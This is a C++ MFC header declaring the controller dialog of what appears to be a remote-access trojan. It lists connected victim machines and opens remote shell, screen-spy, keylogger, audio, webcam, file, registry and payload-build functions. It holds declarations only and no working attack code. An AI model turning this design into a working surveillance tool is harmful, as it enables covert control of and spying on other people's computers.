
// CcRemoteDlg.h: 头文件
//
#include "TrueColorToolBar.h"
#include "PublicStruct.h"
#include "include/IOCPServer.h"
#include "SEU_QQwry.h"
#include "CShellDlg.h"
#include "CSystemDlg.h"
#include "CScreenSpyDlg.h"
#include "CFileManagerDlg.h"
#include "CAudioDlg.h"
#include "CServerDlg.h"
#include "CKeyBoardDlg.h"
#include "CHelpWindow.h"
#include "CBuildDlg.h"
#pragma once


// CCcRemoteDlg 对话框
class CCcRemoteDlg : public CDialogEx
{
// 构造
public:
	CCcRemoteDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_CCREMOTE_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	


	


private:
	//--------------变量及常量----------------
	CBitmap				m_IconBitmap;
	NOTIFYICONDATA		nid;			// 含有图标  消息响应 的一个结构体 用于系统托盘
	CMenu				popup;			// LIST菜单变量
	SEU_QQwry*			m_QQwry;		// 识别IP区域
	CBrush				m_brush;		// 绘色函数
	CTrueColorToolBar	m_ToolBar;		// 工具条按钮控件变量
	CStatusBar			m_wndStatusBar;	// 状态控件
	CListCtrl			m_CList_Online;	// 在线列表变量
	CListCtrl			m_CList_Message;// 消息列表变量
	int					m_OnlineCount;	// 上线计数

	CBitmap				m_BitmapPicLogoA;
	CStatic				m_PicLogoA;		// 左上角logo

	bool				isOnlineIcoTrue;			// list背景是否已经加载
	bool				isMessageIcoTrue;

#define COLUMN_ONLINE_COUNT 7			// 在线列表的个数
#define COLUMN_MESSAGE_COUNT 3			// 消息列表的个数
	int m_Column_Online_Width = 0;		// 在线列表宽度和
	int m_Column_Message_Width = 0;		// 消息列表的宽度和

	COLUMNSTRUCT m_Column_Online_Data[COLUMN_ONLINE_COUNT] =
	{
		{"IP",				148	},
		{"区域",			150	},
		{"计算机名/备注",	180	},
		{"操作系统",		158	},
		{"CPU",				80	},
		{"摄像头",			85	},
		{"PING",			85	}
	};

	COLUMNSTRUCT m_Column_Message_Data[COLUMN_MESSAGE_COUNT] =
	{
		{"信息类型",		68	},
		{"时间",			100	},
		{"信息内容",	    660	}
	};

	//-----------------------函数-----------------------
	void	Test();
	int		InitList();			// 初始化list控件信息
	int		InitMyMenu();		// 初始化主页面上方菜单
	void	InitStatusBar();	// 初始化状态控件
	void	InitToolBar();		// 初始化工具条按钮控件
	void	InitSystemMenu();	// 初始化系统托盘菜单
	void	ListenPort();		// 监听端口设置
	void	InitPic();			// 初始化界面图片
	void	Activate(UINT nPort, UINT nMaxConnections);	// 监听端口
	void	ShowMessage(bool bIsOK, CString strMsg);	// 显示日志

	// 添加信息到列表							
	void	AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing, ClientContext*pContext);

	// 接收到的数据的处理都要调用这个回调函数
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);

	// 控制命令都要经过这个函数
	static void ProcessReceiveComplete(ClientContext *pContext);

public:
	//-------------自定义消息处理-------------
	afx_msg void OnIconNotify(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnAddToList(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenManagerDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenServerDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenRegEditDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenKeyBoardDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);

	//-------------系统消息处理-------------
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineRegist();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineDelete();
	afx_msg void OnMainSet();
	afx_msg void OnMainClose();
	afx_msg void OnMainBuild();
	afx_msg void OnMainAbout();
	afx_msg void OnClose(); 
private:
	void SendSelectCommand(PBYTE pData, UINT nSize);
public:
	afx_msg BOOL OnEraseBkgnd(CDC* pDC);
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);

};
